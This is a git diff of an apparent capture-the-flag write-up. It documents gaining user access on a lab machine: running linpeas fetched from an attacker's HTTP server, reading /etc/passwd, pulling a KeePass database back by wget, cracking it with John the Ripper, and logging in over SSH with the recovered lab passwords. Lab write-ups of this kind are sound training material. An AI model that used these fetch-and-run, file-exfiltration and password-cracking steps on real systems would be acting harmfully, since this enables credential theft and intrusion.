@@ -235,7 +235,7 @@ bash linpeas.sh
 /opt/dataset.kdbx
 ```
 
-<img>
+<img width="696" height="88" alt="image" src="https://github.com/user-attachments/assets/a06125bf-d4bf-44b4-90b3-98bddae61a19" />
 
 That file was the clear pivot point.
 
@@ -260,104 +260,6 @@ wget http://10.49.167.120:8000/dataset.kdbx
 • Used John the Ripper to extract and crack the KeePass hash
 
 ```
-./keepass2john /home/$USER/dataset.kdbx > hash.txt
-./john hash.txt
-```
-
-<img>
-
-• Installed KeePassXC and opened the database using the recovered password
-
-```
-keepassxc dataset.kdbx
-```
-
-<img>
-
-The database contained credentials that immediately changed the game.
-
----
-
-### SSH Access and User Flag
-
-Using the credentials retrieved from the KeePass file, I logged in via SSH as `sysadmin`.
-
-```
-ssh sysadmin@ip
-```
-
-• Successful login confirmed
-• Accessed the home directory
-• Read the `local.txt` flag
-
-```
-6661b61b44d234d230d06bf5b3c075e2
-```
-
-With user-level access secured, the foundation for full compromise was firmly in place.
-
-# Capturing User flag or local.txt flag?
-
-1st i try to identify number of user
-```
-cat /etc/passwd | grep sh
-root:x:0:0:root:/root:/bin/bash
-sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
-sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
-fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
-```
-there are 2 users as i check ubuntu home its empty as for sysadmin i found flag in his directory but i dont have permission to view the content of flag
-```
-$ ls -lah
-total 44K
-drwxr-xr-x 6 sysadmin sysadmin 4.0K Feb 22  2023 .
-drwxr-xr-x 4 root     root     4.0K Jan  2 17:34 ..
--rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
--rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 sysadmin sysadmin 3.7K Feb 25  2020 .bashrc
-drwx------ 2 sysadmin sysadmin 4.0K Jul 26  2022 .cache
-drwx------ 3 sysadmin sysadmin 4.0K Jul 28  2022 .gnupg
--rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
-drwx------ 2 sysadmin sysadmin 4.0K Jul 26  2022 .ssh
--rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
--rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
-drwxr-xr-x 3 root     root     4.0K Jul  8  2022 scripts
-```
-
-I didnt wast time  downloaded linpeas.sh into my system hosted a python server
-```
-https://github.com/peass-ng/PEASS-ng/releases/download/20260101-f70f6a79/linpeas.sh
-```
-```
-python3 -m http.server 8000
-```
-
-In target system 
-```
-cd /dev/shm
-wget http://<your ip>:8000/linpeas.sh
-bash linpeas.sh
-```
-Using linpease i got to know 
-```
-╔══════════╣ Analyzing Keepass Files (limit 70)
--rwxrwxr-x 1 sysadmin sysadmin 1566 Jul  8  2022 /opt/dataset.kdbx
-```
-<img width="696" height="88" alt="image" src="https://github.com/user-attachments/assets/a06125bf-d4bf-44b4-90b3-98bddae61a19" />
-
-in /opt there is a dataset file let pull this to our system and crack it
-
-i open python server in target system
-```
-python3 -m http.server 8000
-```
-and pull this into my system
-```
-wget http://10.49.167.120:8000/dataset.kdbx
-```
-In order to crack this we need to use jhon the ripper by defualt u can download in kali if u have trouble u can follow below download guide
-```
 sudo apt update
 sudo apt install -y \
 build-essential git libssl-dev zlib1g-dev \
@@ -375,26 +277,41 @@ cd ~/john/run
 ./keepass2john /home/$USER/dataset.kdbx > hash.txt
 ./john hash.txt
 ```
-<img of cracking pass>
-
-Let access the 
-```
-sudo apt install -y keepassxc
-keepassxc dataset.kdbx
-# pass: 741852963
-```
-<img of db>
-
-## Let Login ssh with user sysadmin
-```
-ssh sysadmin@ip
-#pass: Cl0udP4ss40p4city#8700
-```
-```
-6661b61b44d234d230d06bf5b3c075e2
-```
-<img width="439" height="67" alt="image" src="https://github.com/user-attachments/assets/60ba1c10-1032-45db-9ab9-7ca71d03f874" />
 
 <img width="962" height="484" alt="img of cracking pass" src="https://github.com/user-attachments/assets/ecc13194-b5ce-4cc0-87e9-d2f09300e31f" />
 
+• Installed KeePassXC and opened the database using the recovered password
+
+```
+keepassxc dataset.kdbx
+# pass: 741852963
+```
+
 <img width="804" height="630" alt="image of db" src="https://github.com/user-attachments/assets/71167515-dc71-47e3-b36b-b086516245f5" />
+
+The database contained credentials that immediately changed the game.
+
+---
+
+### SSH Access and User Flag
+
+Using the credentials retrieved from the KeePass file, I logged in via SSH as `sysadmin`.
+
+```
+ssh sysadmin@ip
+# pass: Cl0udP4ss40p4city#8700
+```
+
+• Successful login confirmed
+• Accessed the home directory
+• Read the `local.txt` flag
+
+<img width="439" height="67" alt="image" src="https://github.com/user-attachments/assets/60ba1c10-1032-45db-9ab9-7ca71d03f874" />
+
+```
+6661b61b44d234d230d06bf5b3c075e2
+```
+
+With user-level access secured, the foundation for full compromise was firmly in place.
+
+
